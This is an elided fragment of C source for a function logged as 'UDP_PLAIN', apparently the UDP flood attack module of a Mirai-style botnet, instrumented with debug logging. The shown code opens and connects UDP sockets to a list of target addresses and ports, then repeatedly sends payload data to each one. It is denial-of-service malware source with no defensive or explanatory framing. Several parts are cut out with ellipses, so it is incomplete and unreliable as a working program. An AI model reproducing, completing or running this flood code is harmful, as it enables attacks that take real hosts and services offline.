...
{
#ifdef DEBUG
    debug_logf("UDP_PLAIN: Starting attack with %u targets\n", (unsigned)targs_len);
#endif
...
#ifdef DEBUG
    debug_logf("UDP_PLAIN: dport=%u sport=%u data_len=%u data_rand=%u\n", 
               (unsigned)dport, (unsigned)sport, (unsigned)data_len, (unsigned)data_rand);
#endif
...
#ifdef DEBUG
    debug_logf("UDP_PLAIN: Setting up sockets for %u targets\n", (unsigned)targs_len);
#endif
    ...
    for (i = 0; i < targs_len; i++)
    {
...
#ifdef DEBUG
        debug_logf("UDP_PLAIN: Target[%d] = %u.%u.%u.%u:%u\n", i,
                   (targs[i].addr >> 0) & 0xFF, (targs[i].addr >> 8) & 0xFF,
                   (targs[i].addr >> 16) & 0xFF, (targs[i].addr >> 24) & 0xFF,
                   ntohs(targs[i].sock_addr.sin_port));
#endif

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
#ifdef DEBUG
            debug_logf("UDP_PLAIN: Failed to create socket for target[%d], errno=%d\n", i, errno);
#endif
            return;
        }
        ...
        {
#ifdef DEBUG
            debug_logf("UDP_PLAIN: Failed to bind socket for target[%d], errno=%d\n", i, errno);
#endif
        }
        ...
        {
#ifdef DEBUG
            debug_logf("UDP_PLAIN: Failed to connect socket for target[%d], errno=%d\n", i, errno);
#endif
        } else {
#ifdef DEBUG
            debug_logf("UDP_PLAIN: Successfully connected socket[%d] fd=%d\n", i, fds[i]);
#endif
        }
    }

#ifdef DEBUG
    debug_logf("UDP_PLAIN: Starting send loop with data_len=%u\n", (unsigned)data_len);
#endif
...
#ifdef DEBUG
            errno = 0;
            ssize_t sent = send(fds[i], data, data_len, MSG_NOSIGNAL);
            if (sent == -1)
            {
                debug_logf("UDP_PLAIN: send failed for target[%d] fd=%d, errno=%d\n", i, fds[i], errno);
            } else {
                if (loop_count < 10 || (loop_count % 1000) == 0) {
                    debug_logf("UDP_PLAIN: sent %zd bytes to target[%d] fd=%d (loop=%d)\n", sent, i, fds[i], loop_count);
                }
            }
#else
...
#ifdef DEBUG
        if (loop_count >= 5000) {
            debug_logf("UDP_PLAIN: Completed %d loops, breaking for debug\n", loop_count);
            break;
        }
#endif
    }
